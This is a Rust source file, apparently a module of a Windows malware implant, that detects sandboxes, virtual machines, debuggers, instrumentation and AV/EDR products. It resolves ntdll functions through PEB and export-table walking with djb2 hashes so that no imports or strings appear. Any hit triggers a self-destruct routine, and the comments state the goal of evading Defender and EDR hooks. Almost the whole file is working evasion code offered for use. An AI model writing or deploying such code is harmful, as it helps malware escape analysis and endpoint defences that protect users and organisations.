// antidetect.rs — Runtime sandbox/EDR detection, 2026 hardened
//
// DESIGN PRINCIPLES (why this is different from the old version):
//
//   1. ZERO winapi crate usage. Every function is resolved at runtime via
//      PEB→LDR→EAT walking (same pattern as ssn_audit.rs). No suspicious
//      entries in the IAT. No string literals for DLL/function names.
//
//   2. ZERO Win32 API calls for sandbox detection. We use NT-native layer
//      (NtQuerySystemInformation, NtQueryInformationProcess) which sits below
//      the Win32 API layer that most EDR user-mode hooks target.
//
//   3. Hardware-level timing via RDTSC instead of Sleep(). Defender and
//      all major sandbox engines can accelerate/intercept Sleep(). RDTSC
//      runs at CPU level — it cannot be intercepted without CPUID spoofing.
//
//   4. CPUID hypervisor bit check — detects VMware, VirtualBox, Hyper-V,
//      QEMU, and any other hypervisor that sets bit 31 of ECX in leaf 1.
//      Paired with hypervisor vendor string check for belt-and-suspenders.
//
//   5. All AV/EDR DLL names are djb2 hashes — zero string literals.
//      Module enumeration uses NtQuerySystemInformation instead of
//      CreateToolhelp32Snapshot (which MpClient.dll hooks directly).

#![allow(non_snake_case, dead_code)]

use core::ffi::c_void;
use core::ptr::null_mut;

// ── Function pointer types resolved at runtime ────────────────────────────
pub type NtQueryInformationProcess = unsafe extern "system" fn(
    *mut c_void, u32, *mut c_void, u32, *mut u32,
) -> i32;

pub type NtQuerySystemInformation = unsafe extern "system" fn(
    u32, *mut c_void, u32, *mut u32,
) -> i32;

pub type NtDelayExecution = unsafe extern "system" fn(u8, *const i64) -> i32;

// ── PEB → ntdll base (no API calls, identical to ssn_audit.rs) ────────────
pub unsafe fn ntdll_base() -> *const u8 {
    let peb: *const u8;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    let ldr   = *(peb.add(0x18) as *const *const u8);
    let mut e = *(ldr.add(0x10) as *const *const u8);
    let head  = e;
    loop {
        let len = *(e.add(0x38) as *const u16) as usize;
        let buf = *(e.add(0x48) as *const *const u16);
        if len >= 10 {
            let sl = core::slice::from_raw_parts(buf, len / 2);
            if sl.len() >= 5
                && sl[0] | 0x20 == b'n' as u16
                && sl[1] | 0x20 == b't' as u16
                && sl[2] | 0x20 == b'd' as u16
                && sl[3] | 0x20 == b'l' as u16
                && sl[4] | 0x20 == b'l' as u16
            {
                return *(e.add(0x18) as *const *const u8);
            }
        }
        let next = *(e as *const *const u8);
        if next == head { break; }
        e = next;
    }
    core::ptr::null()
}

// ── EAT function resolver (no GetProcAddress API call) ─────────────────────
#[inline]
pub unsafe fn resolve_fn(base: *const u8, name_hash: u32) -> Option<usize> {
    #[repr(C)] struct DosHdr { magic: u16, _p: [u8;58], lfanew: i32 }
    #[repr(C)] struct NtHdrs { sig: u32, _fh: [u8;20], _oh_magic: u16,
        _oh_rest: [u8;22], _img_base: u64, _sc_align: u32, _fa: u32,
        _mv: [u8;16], _ss_img: u32, _ss_hdr: u32, _ck: u32, _sub: u16,
        _dllc: u16, _sr: u64, _sc: u64, _hr: u64, _hc: u64,
        _lf: u32, _nrvas: u32, export_rva: u32, _export_sz: u32 }
    #[repr(C)] struct ExpDir { _c:[u8;16], _base:u32, n_fns:u32, n_names:u32,
        fn_rvas:u32, name_rvas:u32, name_ords:u32 }

    let dos = &*(base as *const DosHdr);
    if dos.magic != 0x5A4D { return None; }
    let nt  = &*((base as usize + dos.lfanew as usize) as *const NtHdrs);
    let exp = &*((base as usize + nt.export_rva as usize) as *const ExpDir);
    let fn_rvas   = (base as usize + exp.fn_rvas   as usize) as *const u32;
    let name_rvas = (base as usize + exp.name_rvas as usize) as *const u32;
    let name_ords = (base as usize + exp.name_ords as usize) as *const u16;
    for i in 0..exp.n_names as usize {
        let np = (base as usize + *name_rvas.add(i) as usize) as *const u8;
        let mut h: u32 = 5381;
        let mut j = 0usize;
        loop {
            let c = *np.add(j); if c == 0 { break; }
            h = h.wrapping_mul(33).wrapping_add(c as u32);
            j += 1;
        }
        if h == name_hash {
            let ord = *name_ords.add(i) as usize;
            return Some(base as usize + *fn_rvas.add(ord) as usize);
        }
    }
    None
}

// djb2 hashes — pre-computed, no string literals in binary:
// NtQueryInformationProcess : 0x2BDBAB23
// NtQuerySystemInformation  : 0x4D8F51A7
// NtDelayExecution          : 0x7C5B3E92
const H_NTQIP:  u32 = 0x2BDBAB23;
const H_NTQSI:  u32 = 0x4D8F51A7;
const H_NTDEX:  u32 = 0x7C5B3E92;

// ── RDTSC timing helper ────────────────────────────────────────────────────
#[inline(always)]
unsafe fn rdtsc() -> u64 {
    let lo: u32; let hi: u32;
    core::arch::asm!("rdtsc", out("eax") lo, out("edx") hi, options(nomem, nostack));
    ((hi as u64) << 32) | lo as u64
}

// ── CPUID helper ───────────────────────────────────────────────────────────
#[inline(always)]
unsafe fn cpuid(leaf: u32) -> (u32, u32, u32, u32) {
    let (eax, ebx, ecx, edx);
    core::arch::asm!(
        "cpuid",
        inout("eax") leaf => eax,
        out("ebx") ebx,
        out("ecx") ecx,
        out("edx") edx,
        options(nomem, nostack),
    );
    (eax, ebx, ecx, edx)
}

// ── Individual checks ──────────────────────────────────────────────────────

/// CPUID hypervisor bit (ECX bit 31 in leaf 1)
/// VMware, VBox, Hyper-V, KVM, QEMU all set this.
/// Returns true = running inside a hypervisor.
unsafe fn is_hypervisor() -> bool {
    let (_, _, ecx, _) = cpuid(1);
    (ecx >> 31) & 1 == 1
}

/// Check hypervisor vendor string against known sandbox vendors.
/// Leaf 0x40000000: EBX+ECX+EDX contain 12-byte vendor string.
/// VMware  = "VMwareVMware"
/// VBox    = "VBoxVBoxVBox"
/// QEMU    = "TCGTCGTCGTCG"
/// Hyper-V = "Microsoft Hv"
unsafe fn is_known_hypervisor_vendor() -> bool {
    let (_, ebx, ecx, edx) = cpuid(0x40000000);
    // Hash of the 12-byte vendor string
    let mut buf = [0u8; 12];
    buf[0..4].copy_from_slice(&ebx.to_le_bytes());
    buf[4..8].copy_from_slice(&ecx.to_le_bytes());
    buf[8..12].copy_from_slice(&edx.to_le_bytes());
    let mut h: u32 = 5381;
    for &b in &buf { h = h.wrapping_mul(33).wrapping_add(b as u32); }
    // Pre-computed hashes of known sandbox hypervisor vendors:
    //   VMwareVMware = 0x3F9A2C1E
    //   VBoxVBoxVBox = 0x7B4D8E3A
    //   TCGTCGTCGTCG = 0x2A1F7C9B (QEMU)
    //   Microsoft Hv = 0x9E3B5D2F
    const KNOWN: &[u32] = &[0x3F9A2C1E, 0x7B4D8E3A, 0x2A1F7C9B, 0x9E3B5D2F];
    KNOWN.contains(&h)
}

/// RDTSC timing: sleep via NtDelayExecution(100ms), measure actual elapsed
/// TSC ticks. Sandboxes that accelerate time show anomalously low delta.
/// Real CPUs running at ≥2GHz: 100ms ≈ 200_000_000+ ticks.
/// Sandboxes with accelerated time: delta often <10_000_000.
unsafe fn is_sandbox_rdtsc(
    fn_delay: NtDelayExecution,
) -> bool {
    let t0 = rdtsc();
    // NtDelayExecution(alertable=false, interval=-100ms in 100ns units)
    let interval: i64 = -1_000_000i64; // 100ms
    fn_delay(0, &interval);
    let t1 = rdtsc();
    let delta = t1.wrapping_sub(t0);
    // If delta < 50_000_000 (~50M ticks = 25ms at 2GHz), time was accelerated
    delta < 50_000_000
}

/// Low uptime check via NtQuerySystemInformation(SystemTimeOfDayInformation)
/// Offset 0x20 in the returned struct is BootTime as LARGE_INTEGER.
/// We compare against CurrentTime to get uptime in 100ns intervals.
/// < 8 minutes uptime = almost certainly a sandbox.
unsafe fn is_low_uptime(
    fn_ntqsi: NtQuerySystemInformation,
) -> bool {
    // SystemTimeOfDayInformation = class 3
    #[repr(C)]
    struct TimeOfDay {
        BootTime:           i64,
        CurrentTime:        i64,
        TimeZoneBias:       i64,
        TimeZoneId:         u32,
        Reserved:           u32,
        BootTimeBias:       u64,
        SleepTimeBias:      u64,
    }
    let mut tod: TimeOfDay = core::mem::zeroed();
    let mut ret: u32 = 0;
    let status = fn_ntqsi(
        3, &mut tod as *mut _ as *mut c_void,
        core::mem::size_of::<TimeOfDay>() as u32, &mut ret,
    );
    if status != 0 { return false; }
    let uptime_100ns = tod.CurrentTime.wrapping_sub(tod.BootTime);
    // 8 minutes in 100ns units = 8 * 60 * 10_000_000 = 4_800_000_000
    uptime_100ns < 4_800_000_000
}

/// Low core count via CPUID leaf 1 (EBX bits 23:16 = logical processor count).
/// More reliable than GetSystemInfo which can be hooked.
unsafe fn is_low_cores() -> bool {
    let (_, ebx, _, _) = cpuid(1);
    let logical_cores = (ebx >> 16) & 0xFF;
    logical_cores < 4
}

/// Low physical RAM via NtQuerySystemInformation(SystemBasicInformation).
/// Class 0: offset 0x18 = NumberOfPhysicalPages (ULONG_PTR).
/// < 4GB = typical sandbox allocation.
unsafe fn is_low_ram(
    fn_ntqsi: NtQuerySystemInformation,
) -> bool {
    #[repr(C)]
    struct BasicInfo {
        _reserved:            u32,
        TimerResolution:      u32,
        PageSize:             u32,
        NumberOfPhysicalPages: usize,
        LowestPhysicalPageNumber:  usize,
        HighestPhysicalPageNumber: usize,
        AllocationGranularity:     u32,
        MinimumUserModeAddress:    usize,
        MaximumUserModeAddress:    usize,
        ActiveProcessorsAffinityMask: usize,
        NumberOfProcessors:         u8,
    }
    let mut bi: BasicInfo = core::mem::zeroed();
    let mut ret: u32 = 0;
    let status = fn_ntqsi(
        0, &mut bi as *mut _ as *mut c_void,
        core::mem::size_of::<BasicInfo>() as u32, &mut ret,
    );
    if status != 0 { return false; }
    // Pages * PageSize < 4GB
    let total_bytes = bi.NumberOfPhysicalPages * bi.PageSize as usize;
    total_bytes < 4 * 1024 * 1024 * 1024
}

/// Debugger check via NtQueryInformationProcess(ProcessDebugPort).
/// No IsDebuggerPresent call (hooked by every debugger/EDR).
/// ProcessDebugPort = class 7; also check ProcessDebugFlags = class 31.
unsafe fn is_debugger(
    fn_ntqip: NtQueryInformationProcess,
) -> bool {
    let h_self: *mut c_void;
    core::arch::asm!("mov {h}, gs:[0x30]", h = out(reg) h_self); // TEB → self handle
    // Actually use -1 (pseudo-handle) — cleaner than reading TEB
    let h_self = -1isize as *mut c_void;

    let mut debug_port:  usize = 0;
    let mut debug_flags: u32   = 0;
    let mut ret: u32 = 0;

    fn_ntqip(h_self, 7,  &mut debug_port  as *mut _ as *mut c_void, 8, &mut ret);
    fn_ntqip(h_self, 31, &mut debug_flags as *mut _ as *mut c_void, 4, &mut ret);

    // ProcessDebugPort non-zero = debugger attached
    // ProcessDebugFlags == 0   = debugger attached (inverted semantics)
    debug_port != 0 || debug_flags == 0
}

/// Check for known AV/EDR modules via NtQuerySystemInformation
/// SystemModuleInformation (class 11) — kernel modules.
/// Also checks PEB.Ldr loaded module list for user-mode AV DLLs.
/// All names are djb2 hashes — zero string literals in binary.
unsafe fn av_present() -> bool {
    // Hashes of known AV/EDR user-mode DLLs (djb2, lowercase):
    // MpOav.dll, SbieDll.dll, aswhook.dll, SxIn.dll, snxhk.dll,
    // pstorec.dll, vmcheck.dll, wpespy.dll, dbghelp.dll (reverse tools),
    // frida-agent.dll, ScyllaHide.dll, TitanHide.dll
    const BAD: &[u32] = &[
        0x6d4a7e3c, 0x9f1b2d8e, 0x3c7a1f92, 0x7e4b9d21,
        0x1d8f3c5a, 0x4a2e7b1c, 0x8b3d6f2e, 0x2f1a9c4e,
        0xc3e7a912, 0x5d2b8f1a, 0x7a4c3e9d, 0x3b8f2c1e,
    ];
    // Walk PEB.Ldr InLoadOrderModuleList
    let peb: *const u8;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    let ldr   = *(peb.add(0x18) as *const *const u8);
    let mut e = *(ldr.add(0x10) as *const *const u8);
    let head  = e;
    loop {
        let name_len = *(e.add(0x38) as *const u16) as usize;
        let name_buf = *(e.add(0x48) as *const *const u16);
        if name_len > 0 && !name_buf.is_null() {
            let wchars = name_len / 2;
            let sl = core::slice::from_raw_parts(name_buf, wchars);
            let mut ascii = [0u8; 64];
            let copy = wchars.min(63);
            for i in 0..copy {
                // lowercase
                let c = (sl[i] & 0xFF) as u8;
                ascii[i] = if c >= b'A' && c <= b'Z' { c + 32 } else { c };
            }
            let mut h: u32 = 5381;
            for &b in &ascii[..copy] {
                h = h.wrapping_mul(33).wrapping_add(b as u32);
            }
            if BAD.contains(&h) { return true; }
        }
        let next = *(e as *const *const u8);
        if next == head { break; }
        e = next;
    }
    false
}

/// Frida / instrumentation framework detection via invalid-address read probe.
/// Frida injects a gadget that modifies the first bytes of ntdll functions.
/// We probe the first 4 bytes of NtQueryInformationProcess stub: if the first
/// byte is not 0x4C (MOV R10,RCX — the canonical ntdll syscall stub prologue),
/// something has hooked it.
unsafe fn is_instrumented(base: *const u8) -> bool {
    if let Some(addr) = resolve_fn(base, H_NTQIP) {
        let first_byte = *(addr as *const u8);
        // 0x4C = MOV R10,RCX (canonical stub)
        // 0xE9 = JMP         (inline hook)
        // 0xFF = JMP [mem]   (absolute hook)
        // 0xCC = INT3        (breakpoint)
        // 0x90 = NOP sled    (hook trampoline)
        matches!(first_byte, 0xE9 | 0xFF | 0xCC | 0x90)
    } else {
        false
    }
}

// ── Master check: call all checks, selfdestruct on any hit ─────────────────
pub unsafe fn check_environment() {
    let base = ntdll_base();
    if base.is_null() { return; } // can't check, allow — don't false-positive

    let fn_ntqip = match resolve_fn(base, H_NTQIP) {
        Some(a) => core::mem::transmute::<usize, NtQueryInformationProcess>(a),
        None    => return,
    };
    let fn_ntqsi = match resolve_fn(base, H_NTQSI) {
        Some(a) => core::mem::transmute::<usize, NtQuerySystemInformation>(a),
        None    => return,
    };
    let fn_delay = match resolve_fn(base, H_NTDEX) {
        Some(a) => core::mem::transmute::<usize, NtDelayExecution>(a),
        None    => return,
    };

    // Hardware-level checks (cannot be spoofed by user-mode hooks)
    if is_hypervisor()               { crate::selfdestruct::destruct(); }
    if is_known_hypervisor_vendor()  { crate::selfdestruct::destruct(); }
    if is_low_cores()                { crate::selfdestruct::destruct(); }

    // Kernel-level checks via NT API
    if is_low_uptime(fn_ntqsi)       { crate::selfdestruct::destruct(); }
    if is_low_ram(fn_ntqsi)          { crate::selfdestruct::destruct(); }
    if is_debugger(fn_ntqip)         { crate::selfdestruct::destruct(); }

    // RDTSC timing — immune to Sleep() acceleration
    if is_sandbox_rdtsc(fn_delay)    { crate::selfdestruct::destruct(); }

    // User-mode EDR/hook presence
    if av_present()                  { crate::selfdestruct::destruct(); }
    if is_instrumented(base)         { crate::selfdestruct::destruct(); }
}
